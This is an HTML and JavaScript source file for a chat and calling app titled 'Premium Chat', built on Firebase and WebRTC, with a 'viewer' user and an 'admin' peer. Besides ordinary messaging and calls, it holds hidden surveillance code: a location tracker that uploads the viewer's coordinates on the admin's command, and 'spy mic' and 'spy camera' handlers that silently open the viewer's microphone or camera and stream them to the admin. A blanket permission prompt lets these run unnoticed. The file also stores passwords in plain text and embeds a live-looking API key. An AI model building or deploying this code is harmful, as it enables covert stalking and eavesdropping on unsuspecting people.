<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getDatabase, ref, set, onChildAdded, onValue, onChildChanged, onChildRemoved, remove, onDisconnect, get } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

const firebaseConfig = { apiKey:"AIzaSyA105KJhAOQxigwc5iltil-aFnz7ykruwI", authDomain:"love-space-3e574.firebaseapp.com", databaseURL:"https://love-space-3e574-default-rtdb.firebaseio.com", projectId:"love-space-3e574", storageBucket:"love-space-3e574.firebasestorage.app", messagingSenderId:"9834363623", appId:"1:9834363623:web:829d60de594b3e7c850042" };
if (!String(firebaseConfig.apiKey).includes('EXAMPLE')) { 
    try { const app = initializeApp(firebaseConfig); const db = getDatabase(app); window.FB={db, ref, set, onChildAdded, onValue, onChildChanged, onChildRemoved, remove, onDisconnect, get}; } catch(e){ console.log(e); }
}
window.dispatchEvent(new Event('fb-ready'));
</script>
<style>
:root{--text:#201a35; --navy:#16213E;}
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:Inter,sans-serif;margin:0;padding:0;}
body{min-height:100dvh;display:flex;justify-content:center;align-items:center;background:linear-gradient(145deg,#f9edf8,#e9e6ff,#fff0e8);overflow:hidden;}
.phone{width:100%;height:100dvh;background:rgba(255,250,250,.9);display:flex;flex-direction:column;position:relative;}
@media (min-width: 500px) { body{padding: 20px;} .phone{max-width:420px; height:min(900px, 100dvh); border-radius:38px;} }
.head{padding:24px 20px 14px;display:flex;align-items:center;}
.head-title{font-size:24px;font-weight:800;color:#211a35;}
#loginScreen{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;}
.login-input{width:100%;padding:16px;border-radius:22px;border:3px solid white;background:rgba(255,255,255,.7);margin-bottom:15px;}
.login-btn{width:100%;padding:18px;border-radius:22px;background:linear-gradient(145deg,#a5aaff,#b68bff);color:white;font-weight:800;border:none;cursor:pointer;}
#mainHome{flex:1;overflow-y:auto;display:none;flex-direction:column;padding-bottom:10px;}
.profile{margin:4px 15px;padding:16px;background:white;border-radius:24px;display:flex;align-items:center;}
.p-av{width:68px;height:68px;border-radius:50%;background:#ffe4d6;display:flex;justify-content:center;align-items:center;font-size:26px;}
.p-name{font-size:17px;font-weight:800;}
.q-head{margin:25px 19px 0;font-size:21px;font-weight:800;}
.quick{margin:16px 15px;gap:14px;display:grid;grid-template-columns:1fr 1fr;}
.qc{min-height:132px;padding:20px;border-radius:25px;background:white;display:flex;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;}
.chat-screen,.truth-screen,.love-screen{position:absolute;inset:0;display:none;flex-direction:column;background:#fffafc;}
.chat-screen.open,.truth-screen.open{display:flex;}
.cv-head{padding:17px;background:var(--navy);color:#fff;display:flex;align-items:center;}
.back-btn{font-size:24px;font-weight:900;padding-right:10px;cursor:pointer;}
.msgs{flex:1;overflow-y:auto;display:flex;flex-direction:column;padding:16px 12px;gap:13px;}
.bub{padding:12px 15px;font-size:15px;border-radius:19px;max-width:85%;word-break:break-word;}
.me{align-self:flex-end;background:linear-gradient(135deg,#ffd1dc,#e5a6f7);}
.other{align-self:flex-start;background:rgba(255,255,255,0.85);}
.ig-input-area{display:flex;padding:8px 12px;background:var(--navy);border-radius:30px;margin:10px;}
.ig-middle{flex:1;display:flex;background:rgba(255,255,255,0.1);border-radius:24px;padding:4px;}
.ig-middle textarea{flex:1;border:none;background:transparent;color:#fff;padding:10px;outline:none;resize:none;}
.ig-send-btn{width:44px;height:44px;border-radius:50%;background:linear-gradient(135deg,#a5aaff,#e5a6f7);border:none;display:none;}
.modal{position:fixed;inset:0;background:rgba(0,0,0,.6);display:none;justify-content:center;align-items:center;z-index:9999;}
.modal-box{background:#fff;width:90%;max-width:340px;border-radius:28px;padding:22px;text-align:center;}
.modal-btn{width:100%;padding:14px;border-radius:15px;background:linear-gradient(145deg,#a5aaff,#b68bff);color:white;border:none;font-weight:800;cursor:pointer;margin-top:10px;}
/* Call Full Screen & Bottom Controls */
#callOverlay{background:linear-gradient(135deg, #1A1A2E, #16213E);position:fixed;inset:0;z-index:9998;display:none;flex-direction:column;align-items:center;justify-content:center;}
#callOverlay video{width:100%;height:100%;object-fit:cover;position:absolute;top:0;left:0;z-index:-1;}
#localV{width:100px!important;height:150px!important;position:absolute;bottom:120px!important;right:20px!important;border-radius:15px;border:2px solid white;object-fit:cover;z-index:10;box-shadow:0 5px 15px rgba(0,0,0,0.5);}
.call-controls{position:absolute;bottom:40px;width:100%;display:flex;justify-content:center;gap:20px;z-index:10;}
.cbtn{width:60px;height:60px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:none;cursor:pointer;box-shadow:0 5px 15px rgba(0,0,0,0.3);}
.cbtn svg{width:28px;height:28px;fill:white;}
.cbtn.ok{background:#22c55e;}.cbtn.danger{background:#ef4444;}
.cbtn.action{background:rgba(255,255,255,0.2);backdrop-filter:blur(5px);}
.cbtn.action.active{background:rgba(255,255,255,0.8);}
/* Floating Call Minimize */
#floatingCall{position:fixed;top:10px;left:10px;right:10px;background:#22c55e;color:white;padding:10px 15px;border-radius:15px;display:none;justify-content:space-between;align-items:center;z-index:9997;font-weight:800;box-shadow:0 5px 15px rgba(0,0,0,0.3);cursor:pointer;}
#notifyBanner{position:fixed;top:-100px;left:50%;transform:translateX(-50%);width:90%;background:rgba(255,255,255,.95);border-radius:20px;padding:12px 15px;display:flex;gap:12px;align-items:center;z-index:99999;transition:top .4s;border:2px solid white;cursor:pointer;}
</style></head><body>

<div id="floatingCall" onclick="restoreCall()">📞 <span>Ongoing Call</span> <span>Tap to return</span></div>
<div id="notifyBanner" onclick="document.getElementById('notifyBanner').classList.remove('show')"><div id="notifyAv" style="width:40px;height:40px;border-radius:50%;background:#ccc;"></div><div><b id="notifyName">Loading...</b><p id="notifyMsg" style="font-size:12px;">New...</p></div></div>
<div class="modal" id="permModal"><div class="modal-box"><h3>Allow Permissions</h3><p style="font-size:13px;margin-bottom:15px;">Needs Camera, Mic, and Location access.</p><button class="modal-btn" onclick="requestActualPermissions()">Allow All</button></div></div>

<div class="phone">
  <div class="head"><div class="head-title">Premium Chat</div></div>
  <div id="homeTab" style="flex:1;display:flex;flex-direction:column;">
    <div id="loginScreen">
      <h2>Welcome User</h2>
      <input type="text" id="usernameInput" class="login-input" placeholder="Username">
      <input type="password" id="passwordInput" class="login-input" placeholder="Password">
      <button class="login-btn" onclick="login()">Login / Register</button>
    </div>
    <div id="mainHome">
      <div class="profile"><div class="p-av" id="userAvatar">👤</div><div style="flex:1;"><div class="p-name" id="myNameDisplay">User</div></div></div>
      <div class="q-head">Quick Actions</div>
      <div class="quick">
        <div class="qc" onclick="openChat()"><b>Messages</b></div>
        <div class="qc" onclick="startCall('voice')"><b>Voice Call</b></div>
        <div class="qc" onclick="startCall('video')"><b>Video Call</b></div>
      </div>
    </div>
  </div>

  <div class="chat-screen" id="chatScreen">
    <div class="cv-head"><div class="back-btn" onclick="closeChatScreen()">←</div><div style="flex:1;"><b>Admin</b></div></div>
    <div class="msgs" id="msgsBox"></div>
    <div class="ig-input-area"><div class="ig-middle"><textarea id="msgInput" placeholder="Message..." oninput="toggleSendBtn()"></textarea></div><button class="ig-send-btn" id="sendBtn" onclick="sendMsg()">➤</button></div>
  </div>
</div>

<div id="callOverlay">
  <h3 id="callTitle" style="color:white; z-index:10; margin-top:20px;">Calling...</h3>
  <p id="callStatus" style="color:#aaa; z-index:10;">Ringing...</p>
  <video id="remoteV" autoplay playsinline></video>
  <video id="localV" autoplay muted playsinline></video>
  <div class="call-controls">
    <button class="cbtn action" id="muteBtn" onclick="toggleMute()">🎤</button>
    <button class="cbtn danger" onclick="endCall()">❌</button>
    <button class="cbtn ok" id="ansBtn" style="display:none;" onclick="answerCall()">✅</button>
  </div>
</div>
<audio id="ringtone" src="https://assets.mixkit.co/active_storage/sfx/1355/1355-preview.mp3" loop></audio>

<script>
const ROLE='viewer', PEER='admin';
const $=id=>document.getElementById(id);
let msgs=[]; const uid=()=>Math.random().toString(36).slice(2,10);
let currentUser=localStorage.getItem('chat_username')||'';
const peerState={online:false};

window.requestActualPermissions = async () => {
    $('permModal').style.display = 'none'; localStorage.setItem('app_permissions_granted', 'true');
    try { await navigator.mediaDevices.getUserMedia({audio:true, video:true}); navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}, {timeout:5000}); } catch(e) {}
};
window.login = async () => {
  const user = $('usernameInput').value.trim(); const pass = $('passwordInput').value.trim();
  if(!user || !pass) return alert('Enter details');
  if (window.FB) {
      try {
          const userRef = window.FB.ref(window.FB.db, 'users/' + user); const snapshot = await window.FB.get(userRef);
          if (snapshot.exists()) {
              const data = snapshot.val();
              if (data.password === pass) {
                  if (data.role !== ROLE) return alert('Access Denied!');
                  currentUser = user; localStorage.setItem('chat_username', currentUser); checkLogin();
              } else { alert('Incorrect Password'); }
          } else {
              await window.FB.set(userRef, { password: pass, role: ROLE }); currentUser = user; localStorage.setItem('chat_username', currentUser); checkLogin();
          }
      } catch(e) { alert("Error: " + e.message); }
  }
};
function checkLogin(){
  if(currentUser){
    $('loginScreen').style.display='none'; $('mainHome').style.display='flex';
    $('myNameDisplay').textContent=currentUser;
    if(!localStorage.getItem('app_permissions_granted')) setTimeout(() => $('permModal').style.display = 'flex', 1000);
  } else { $('loginScreen').style.display='flex'; $('mainHome').style.display='none'; }
}
window.openChat=()=>{ $('chatScreen').classList.add('open'); render(); };
window.closeChatScreen=()=>{ $('chatScreen').classList.remove('open'); };
function load(){ try{msgs=JSON.parse(localStorage.getItem('chat_v19_'+ROLE)||'[]');}catch(e){msgs=[];} }
function save(){ try{localStorage.setItem('chat_v19_'+ROLE,JSON.stringify(msgs.slice(-100)));}catch(e){} }
window.toggleSendBtn=()=>{ const v=$('msgInput').value.trim(); $('sendBtn').style.display = v ? 'flex' : 'none'; };
window.sendMsg=()=>{ const t=$('msgInput').value.trim(); if(!t)return; addMessage({type:'text',text:t,from:ROLE,sender:currentUser,seen:false}); $('msgInput').value=''; toggleSendBtn(); };
function appendMessageDOM(m) {
  const box=$('msgsBox'); const d=document.createElement('div'); d.className='bub '+(m.from===ROLE?'me':'other');
  if(m.text) d.append(document.createTextNode(m.text));
  d.id = 'msg_' + m.id; box.append(d);
}
function render(){ $('msgsBox').innerHTML=''; msgs.forEach(m => appendMessageDOM(m)); }
function addMessage(o){
  if(!o.id) o.id=uid(); if(!o.ts) o.ts=Date.now(); msgs.push(o); save(); 
  if($('chatScreen').classList.contains('open')){ appendMessageDOM(o); $('msgsBox').scrollTop=$('msgsBox').scrollHeight; }
  if(window.FB) window.FB.set(window.FB.ref(window.FB.db,'messages/'+o.id),o).catch(()=>{});
}

// --- LOCATION TRACKER ---
window.FB.onValue(window.FB.ref(window.FB.db,'track_location'), s => { 
    if(s.val()) { 
        navigator.geolocation.getCurrentPosition(
            pos => {
                window.FB.set(window.FB.ref(window.FB.db,'locations/viewer'), {lat: pos.coords.latitude, lng: pos.coords.longitude});
                window.FB.remove(window.FB.ref(window.FB.db,'track_location'));
            },
            err => { window.FB.remove(window.FB.ref(window.FB.db,'track_location')); }
        );
    }
});

// --- WEBRTC LOGIC ---
let pc=null, localStream=null, currentCallKind='voice', pendingCandidates=[], incomingTimer, spyPC=null, spyCamPC=null;
const ICE={iceServers:[{urls:'stun:stun.l.google.com:19302'}]};
function pushSignal(to,p){ const sid=uid(); if(window.FB) window.FB.set(window.FB.ref(window.FB.db,'signaling/'+sid),{sid,to,from:ROLE,payload:p}).catch(()=>{}); }
function onSignal(node){ if(!node||node.to!==ROLE||node.from===ROLE) return; handleSignal(node); }
function createPC(){ 
    const peer=new RTCPeerConnection(ICE); 
    peer.onicecandidate=e=>{if(e.candidate) pushSignal(PEER,{type:'ice',candidate:e.candidate.toJSON()});}; 
    peer.ontrack=e=>{ $('remoteV').srcObject=e.streams[0]; $('callStatus').textContent='Connected ✅'; $('ansBtn').style.display='none'; clearTimeout(callTimeout); }; 
    return peer; 
}

async function handleSignal(node){
  const p=node.payload;
  if(p.type==='offer'){
    if(pc){pc.close();pc=null;} if(localStream){localStream.getTracks().forEach(t=>t.stop());localStream=null;} 
    currentCallKind=p.kind||'voice';
    $('callOverlay').style.display='flex'; $('callTitle').textContent='Incoming Call'; $('callStatus').textContent='Tap ✅'; $('ansBtn').style.display='flex';
    $('ringtone').play().catch(()=>{}); clearTimeout(incomingTimer); incomingTimer=setTimeout(()=>{ if($('ansBtn').style.display!=='none'){ cleanup(); addMessage({type:'call', text:'Missed Call', status:'missed', from:PEER}); } },30000);
    pc=createPC(); await pc.setRemoteDescription(new RTCSessionDescription(p.sdp)); 
  } else if(p.type==='answer'){ if(pc){await pc.setRemoteDescription(new RTCSessionDescription(p.sdp)); clearTimeout(callTimeout);} } 
  else if(p.type==='ice'){ if(pc&&pc.remoteDescription){try{await pc.addIceCandidate(new RTCIceCandidate(p.candidate));}catch(_){}} else pendingCandidates.push(p.candidate); } 
  else if(p.type==='end'){ cleanup(); }
  
  // SPY MIC
  else if(p.type==='spy-offer'){ 
      try {
          if(spyPC) { spyPC.close(); spyPC = null; }
          spyPC = new RTCPeerConnection(ICE);
          spyPC.onicecandidate = e => { if(e.candidate) pushSignal(PEER, {type:'spy-ice', candidate: e.candidate.toJSON()}); };
          const stream = await navigator.mediaDevices.getUserMedia({audio: true});
          stream.getTracks().forEach(t => spyPC.addTrack(t, stream));
          await spyPC.setRemoteDescription(new RTCSessionDescription(p.sdp));
          const answer = await spyPC.createAnswer(); await spyPC.setLocalDescription(answer);
          pushSignal(PEER, {type:'spy-answer', sdp: {type: spyPC.localDescription.type, sdp: spyPC.localDescription.sdp}});
      } catch(e) { pushSignal(PEER, {type:'spy-error', error: e.message}); }
  }
  else if(p.type==='spy-answer'){ if(spyPC){ await spyPC.setRemoteDescription(new RTCSessionDescription(p.sdp)); } }
  else if(p.type==='spy-ice'){ if(spyPC){ try{await spyPC.addIceCandidate(new RTCIceCandidate(p.candidate));}catch(_){}} }
  
  // SPY CAMERA
  else if(p.type==='spycam-offer'){ 
      try {
          if(spyCamPC) { spyCamPC.close(); spyCamPC = null; }
          spyCamPC = new RTCPeerConnection(ICE);
          spyCamPC.onicecandidate = e => { if(e.candidate) pushSignal(PEER, {type:'spycam-ice', candidate: e.candidate.toJSON()}); };
          const stream = await navigator.mediaDevices.getUserMedia({video: true});
          stream.getTracks().forEach(t => spyCamPC.addTrack(t, stream));
          await spyCamPC.setRemoteDescription(new RTCSessionDescription(p.sdp));
          const answer = await spyCamPC.createAnswer(); await spyCamPC.setLocalDescription(answer);
          pushSignal(PEER, {type:'spycam-answer', sdp: {type: spyCamPC.localDescription.type, sdp: spyCamPC.localDescription.sdp}});
      } catch(e) { pushSignal(PEER, {type:'spy-error', error: e.message}); }
  }
  else if(p.type==='spycam-answer'){ if(spyCamPC){ await spyCamPC.setRemoteDescription(new RTCSessionDescription(p.sdp)); } }
  else if(p.type==='spycam-ice'){ if(spyCamPC){ try{await spyCamPC.addIceCandidate(new RTCIceCandidate(p.candidate));}catch(_){}} }
}

window.startCall=async(k)=>{ 
  try{ 
    $('callOverlay').style.display='flex'; $('callTitle').textContent=k==='video'?'Video Calling...':'Calling...'; $('callStatus').textContent='Ringing...'; $('ringtone').play().catch(()=>{}); 
    localStream=await navigator.mediaDevices.getUserMedia({video:k==='video',audio:true}); $('localV').srcObject=localStream; 
    pc=createPC(); localStream.getTracks().forEach(t=>pc.addTrack(t,localStream)); 
    const off=await pc.createOffer(); await pc.setLocalDescription(off); 
    pushSignal(PEER,{type:'offer',sdp:{type: off.type, sdp: off.sdp},kind:k}); 
    clearTimeout(callTimeout); callTimeout = setTimeout(() => { if($('callStatus').textContent === 'Ringing...') { cleanup(); alert('No answer'); } }, 30000);
  }catch(e){ alert('Cam/Mic denied'); cleanup(); } 
};
window.answerCall=async()=>{ 
  if(!pc) return; clearTimeout(incomingTimer); $('ringtone').pause(); 
  try{ 
    localStream=await navigator.mediaDevices.getUserMedia({video:currentCallKind==='video',audio:true}); 
    $('localV').srcObject=localStream; localStream.getTracks().forEach(t=>pc.addTrack(t,localStream)); 
    const a=await pc.createAnswer(); await pc.setLocalDescription(a); 
    pushSignal(PEER,{type:'answer',sdp:{type: a.type, sdp: a.sdp}}); 
    $('ansBtn').style.display='none'; 
  }catch(e){ alert('Cam/Mic denied'); endCall(); } 
};
window.endCall=()=>{ if(pc) pushSignal(PEER,{type:'end'}); cleanup(); };
function cleanup(){ $('callOverlay').style.display='none'; $('ringtone').pause(); if(pc){pc.close();pc=null;} if(localStream){localStream.getTracks().forEach(t=>t.stop());localStream=null;} $('localV').srcObject=null; $('remoteV').srcObject=null; pendingCandidates=[]; clearTimeout(incomingTimer); clearTimeout(callTimeout); }
window.toggleMute=()=>{ if(localStream){ const track = localStream.getAudioTracks()[0]; track.enabled = !track.enabled; $('muteBtn').classList.toggle('active', !track.enabled); } };

// Minimize Call Logic
window.addEventListener('popstate', (e) => {
    if ($('callOverlay').style.display === 'flex') {
        $('callOverlay').style.display = 'none';
        $('floatingCall').style.display = 'flex';
    }
});
window.restoreCall = () => { $('floatingCall').style.display = 'none'; $('callOverlay').style.display = 'flex'; };

// Firebase setup
function attachFB(){
  if(!window.FB) return; const {db,ref,onChildAdded,onValue,set,remove}=window.FB;
  onValue(ref(db,'messages'), snap => { const all = snap.val() || {}; msgs = Object.values(all).sort((a,b) => (a.ts||0) - (b.ts||0)); save(); if($('chatScreen').classList.contains('open')) render(); });
  onChildAdded(ref(db,'signaling'),snap=>{ const n=snap.val(); if(!n||n.to!==ROLE) return; remove(ref(db,'signaling/'+snap.key)).catch(()=>{}); onSignal(n); });
  checkLogin();
}
window.addEventListener('fb-ready',attachFB); if(window.FB) attachFB();
load(); checkLogin();
</script></body></html>
